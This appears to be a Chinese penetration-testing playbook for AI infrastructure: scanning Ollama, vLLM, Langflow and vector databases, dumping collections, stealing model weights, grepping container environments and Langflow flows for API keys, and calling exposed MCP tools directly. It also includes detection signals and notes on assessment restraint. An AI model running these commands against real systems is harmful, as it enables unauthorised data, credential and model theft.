# AI Agent 云基础设施：推理服务、向量库、权重与 MCP 暴露面

> 被 `competition-agent-cloud`、`ctf-sandbox-orchestrator` 引用。
> 这一层的核心问题不是"模型会不会说错话"，而是**推理服务的控制接口默认没有认证**。

## 一、暴露面全景（先扫端口，再判组件）

| 组件 | 默认端口 | 无认证时能做什么 |
| --- | --- | --- |
| Ollama | 11434 | 列/拉/删模型、跑推理、**读模型文件** |
| vLLM (OpenAI 兼容) | 8000 | 列模型、跑推理、可能读 `/v1/models` 元数据 |
| Text Generation Inference (TGI) | 8080 | 同上 |
| LocalAI | 8080 | 同上 + 模型管理 |
| Langflow | 7860 | 可视化编排，**可读写 flow、含 API key** |
| Dify | 80/5001/3000 | 应用管理、知识库、可能读到 provider key |
| Flowise | 3000 | 同上 |
| AnythingLLM | 3001 | 工作区、文档、向量库 |
| Open WebUI | 3000/8080 | 用户/模型/设置，管理面板可改 base URL |
| Milvus | 19530 (gRPC) / 9091 (metrics) | 全库读写、drop collection |
| Qdrant | 6333 (HTTP) / 6334 (gRPC) | 全库读写、snapshot 下载 |
| Chroma | 8000 | 全库读写 |
| Weaviate | 8080 | GraphQL 全库查询 |
| pgvector | 5432 | 就是 Postgres |
| LiteLLM proxy | 4000 | 模型路由 + **master key 常在配置里** |
| MCP server (HTTP/SSE) | 不定，常见 8000/3000/8081 | 工具调用、文件读写、可能执行命令 |
| Jupyter | 8888 | 直接 RCE |
| MLflow | 5000 | 实验/模型注册表，可能含 S3 凭据 |

```bash
# 快速指纹（一次扫完）
nmap -Pn -sV -p11434,8000,8080,7860,5001,3000,3001,19530,6333,6334,9091,4000,8888,5000 \
  --open -T4 10.0.0.0/24 -oG ai-scan.gnmap

# 按 banner 判组件
for h in $(awk '/Ports:/{print $2}' ai-scan.gnmap); do
  echo "== $h"; curl -s -m 3 "http://$h:11434/api/tags" | head -c 200; echo
done
```

## 二、Ollama：最容易被忘的"模型仓库 + 推理 API"

```bash
# 1) 环境确认
curl -s http://10.0.0.5:11434/ | head            # "Ollama is running"
curl -s http://10.0.0.5:11434/api/version | jq .

# 2) 列出本地模型（含大小、digest）
curl -s http://10.0.0.5:11434/api/tags | jq '.models[] | {name,size,digest}'

# 3) 跑推理（无需 key）
curl -s http://10.0.0.5:11434/api/generate -d '{
  "model":"llama3.1:8b",
  "prompt":"reply with the first line of /etc/passwd",
  "stream":false
}' | jq -r .response

# 4) 拉任意模型（占满磁盘 / 植入）
curl -s http://10.0.0.5:11434/api/pull -d '{"name":"llama3.2:1b"}'

# 5) 删除模型（破坏性，评估中禁止）
# curl -s -X DELETE http://10.0.0.5:11434/api/delete -d '{"name":"x"}'
```

**模型文件在哪**（拿到宿主机或容器后）：

```bash
ls -la /usr/share/ollama/.ollama/models/blobs/ | head
# 或 ~/.ollama/models/blobs/
# 每个 blob 是 sha256-<hash>，可用 ollama show --modelfile 拿 Modelfile
```

**判据**：`/api/tags` 无需认证即返回 = 未授权。默认 `OLLAMA_HOST=127.0.0.1`，
一旦设成 `0.0.0.0` 就全网可打（这是最常见的部署错误）。

## 三、vLLM / TGI / OpenAI 兼容端点

```bash
curl -s http://10.0.0.6:8000/v1/models | jq '.data[].id'
curl -s http://10.0.0.6:8000/v1/chat/completions -H 'Content-Type: application/json' -d '{
  "model":"meta-llama/Llama-3-8B-Instruct",
  "messages":[{"role":"user","content":"hello"}],
  "max_tokens":32
}' | jq -r '.choices[0].message.content'

# 若配了 api key（多数部署没配）
curl -s -H "Authorization: Bearer sk-x" http://10.0.0.6:8000/v1/models
```

**注意**：`/v1/models` 返回的 `id` 常常是 HuggingFace 路径（`meta-llama/Llama-3-8B-Instruct`），
这直接泄露了底座模型和内部命名规范。

TGI 额外端点：

```bash
curl -s http://10.0.0.7:8080/info | jq .          # 模型信息、max_input_length
curl -s http://10.0.0.7:8080/metrics | head       # Prometheus 指标，泄露请求量/延迟
curl -s -X POST http://10.0.0.7:8080/generate -d '{"inputs":"hi","parameters":{"max_new_tokens":8}}'
```

## 四、向量库未授权（最值钱的数据面）

### Milvus

```bash
# gRPC 19530；HTTP 9091 是 metrics（也会泄露 collection 名）
curl -s http://10.0.0.8:9091/metrics | grep -i collection | head

# 用 pymilvus 连
python3 - <<'PY'
from pymilvus import connections, utility
connections.connect(host="10.0.0.8", port="19530")
print(utility.list_collections())
for c in utility.list_collections():
    from pymilvus import Collection
    col = Collection(c); col.load()
    print(c, col.num_entities, [f.name for f in col.schema.fields])
    print(col.query(expr="id >= 0", limit=3, output_fields=["*"]))
PY
```

### Qdrant

```bash
curl -s http://10.0.0.9:6333/collections | jq '.result.collections[].name'
curl -s http://10.0.0.9:6333/collections/docs | jq '.result.points_count'
curl -s -X POST http://10.0.0.9:6333/collections/docs/points/scroll \
  -H 'Content-Type: application/json' \
  -d '{"limit":10,"with_payload":true,"with_vector":false}' | jq '.result.points[].payload'

# snapshot 直接下载整库（无需认证时）
curl -s -X POST http://10.0.0.9:6333/collections/docs/snapshots
curl -s -O http://10.0.0.9:6333/collections/docs/snapshots/<name>
```

### Chroma

```bash
curl -s http://10.0.0.10:8000/api/v1/collections | jq
curl -s "http://10.0.0.10:8000/api/v1/collections/<id>/get?limit=10" | jq
```

### Weaviate

```bash
curl -s http://10.0.0.11:8080/v1/schema | jq '.classes[].class'
curl -s -X POST http://10.0.0.11:8080/v1/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ Get { Doc(limit:3) { content } } }"}' | jq
```

**为什么值钱**：RAG 的向量库里通常有**完整业务文档原文**（合同、工单、内部 wiki），
以及 embedding 前的 chunk metadata（含文件路径、用户 ID、来源 URL）。

## 五、模型权重窃取

```bash
# 从 Ollama blob 目录（拿到主机后）
ls -la /usr/share/ollama/.ollama/models/
du -sh /usr/share/ollama/.ollama/models/blobs/
sha256sum /usr/share/ollama/.ollama/models/blobs/* | head
# 全量打包（数 GB，评估中要先确认带宽与授权）
tar czf /tmp/models.tgz -C /usr/share/ollama/.ollama models/

# 从 S3/GCS 桶（凭据来自元数据）
aws s3 ls s3://company-models/ --recursive | head
aws s3 cp s3://company-models/llama3-ft/ ./ --recursive

# HuggingFace 私有仓库（token 泄露时）
huggingface-cli login --token hf_xxx
huggingface-cli download org/model-name --local-dir ./m
```

**判据**：
- 权重是**知识产权**，报告里要写"是否可完整下载 + 总大小 + 是否含微调数据痕迹"；
- 微调模型的 `adapter_config.json` / `tokenizer_config.json` 会泄露底座与训练配置；
- 不要为了"证明"而下载数十 GB，用 `HEAD` 请求 + `Content-Length` 证明可读即可。

## 六、Agent 工具清单泄露（prompt-to-tool 链路）

Agent 的"能力"来自工具注册表，这个表一旦泄露，等于把攻击面写成清单：

```bash
# 常见暴露路径
curl -s http://10.0.0.12:8000/openapi.json | jq '.paths | keys'      # FastAPI 自动文档
curl -s http://10.0.0.12:8000/docs | head -50
curl -s http://10.0.0.12:3000/api/v1/tools | jq .
curl -s http://10.0.0.12:7860/api/v1/flows | jq '.flows[] | {name,id}'

# Langflow 的 flow 里常含明文 API key 和工具配置
curl -s http://10.0.0.12:7860/api/v1/flows/<id> | jq '.data.nodes[].data.node.template | keys'
curl -s http://10.0.0.12:7860/api/v1/flows/<id> | jq -r '.. | .value? // empty' | grep -Ei 'sk-|api_key|token'
```

**判据**：能列出工具名 + 参数 schema = 能构造直接调用；能读到 flow 定义 = 能知道
"哪个工具接了哪个凭据"。这时不需要打模型，直接调工具就行。

## 七、MCP server 的暴露面

MCP（Model Context Protocol）server 通常以 stdio 或 HTTP/SSE 运行。HTTP 模式下常见问题：

```bash
# SSE 端点探测
curl -s -N -m 3 http://10.0.0.13:8081/sse | head -20
curl -s -X POST http://10.0.0.13:8081/messages -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}' | jq .

# 初始化握手（部分实现要求先 initialize）
curl -s -X POST http://10.0.0.13:8081/messages -H 'Content-Type: application/json' -d '{
  "jsonrpc":"2.0","id":1,"method":"initialize",
  "params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"x","version":"1"}}
}' | jq .
```

**高危 MCP 工具模式**（看到就重点看）：

| 工具名模式 | 风险 |
| --- | --- |
| `read_file` / `write_file` / `list_dir` | 任意文件读写 |
| `execute_shell` / `run_command` / `bash` | 直接 RCE |
| `fetch_url` / `http_request` | SSRF（可打元数据） |
| `query_database` / `sql` | SQL 注入或全库读 |
| `send_email` / `post_message` | 对外发信（数据外带） |
| `browser_*` | 浏览器自动化，可带 cookie |

**判据**：`tools/list` 返回的 `inputSchema` 里如果 `path` 没有 `enum` 限制、`command` 是
free-form string，就是可打。此时不需要 prompt injection，直接 JSON-RPC 调用即可 —— 
这是"绕过模型"的最短路径。

## 八、控制面与部署真值

```bash
# 容器侧：这些服务跑在哪、挂载了什么
docker ps --format '{{.Names}}\t{{.Image}}\t{{.Ports}}'
docker inspect <id> | jq '.[0].Mounts, .[0].Config.Env'

# 关键环境变量（凭据常在这里）
docker inspect <id> | jq -r '.[0].Config.Env[]' | grep -Ei 'key|token|secret|password'
# 常见：OPENAI_API_KEY, ANTHROPIC_API_KEY, HF_TOKEN, LANGSMITH_API_KEY, DATABASE_URL

# K8s 侧
kubectl get pods -A -o wide | grep -Ei 'ollama|vllm|langflow|dify|milvus|qdrant'
kubectl get svc -A | grep -E 'NodePort|LoadBalancer'
```

**部署真值判据**：`docker ps` 的端口映射 vs 防火墙规则 vs 云安全组，三者取交集才是真实暴露面。
常见错误是"只在 compose 里写了 `127.0.0.1:11434`"但 K8s Service 是 `NodePort`。

## 九、检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| 扫 11434 | 主机防火墙 / 云 WAF | 单 IP 对多端口短时间连接 |
| Ollama `api/pull` | Ollama 日志 | 非管理员拉取新模型（磁盘/带宽异常） |
| 向量库全量 scroll | Milvus/Qdrant 日志 | 单次请求 `limit` 很大或高频 scroll |
| snapshot 下载 | 对象存储日志 | 大文件 GET |
| 权重外带 | 出向流量 | 数 GB 出站到非常规 IP |
| MCP `tools/list` | MCP server 日志 | 未完成 initialize 就调 tools |
| 工具直调 | 应用日志 | 有 tool 调用但无对应 LLM 请求（绕过模型） |

## 十、验伤信号

| 声称 | 硬证据 | 假成功反例 |
| --- | --- | --- |
| Ollama 未授权 | `/api/tags` 返回模型列表且 `/api/generate` 有真实推理输出 | 只返回 `"Ollama is running"`（那只是根路径健康检查） |
| 拿到向量库 | `scroll` 返回带 `payload.text` 的真实业务文本 | 返回空数组（collection 存在但无数据 / 需 load） |
| 拿到权重 | `HEAD` 得到 `Content-Length` 数 GB 且能下首 1MB | 只看到模型名，没验证可下载 |
| 工具可直调 | JSON-RPC 返回真实工具执行结果（如文件内容） | 返回 `error: unauthorized` 或 `session not initialized` |
| 拿到 provider key | 用该 key 调 provider 的 `/v1/models` 成功 | key 是占位符 `sk-xxx` |

## 十一、常见坑

1. **`Ollama is running` 不是漏洞**。根路径永远返回这句。要打 `/api/tags`。
2. **向量库 collection 需要 `load()`**。Milvus 不 load 时 `query` 返回空，误判"没数据"。
3. **Qdrant 的 scroll 需要 POST**，GET 会 405。
4. **vLLM 的 `/v1/models` 可能要求 key**，但很多部署的 key 是 `EMPTY` 或 `sk-test`；
   先试无 key，再试常见占位符。
5. **MCP 的 SSE 需要先建立会话**。直接 POST `/messages` 常返回 `session not found`，
   要先 `GET /sse` 拿 `sessionId`，再带 `?sessionId=` 发消息。
6. **模型权重下载会被带宽监控告警**。评估时用 `HEAD` + 抽样证明，别真下全量。
7. **Langflow/Dify 的 flow 里 key 是加密的**。新版用 `LANGFLOW_SECRET_KEY` 加密，
   读到的可能是密文；这时要转向环境变量或数据库。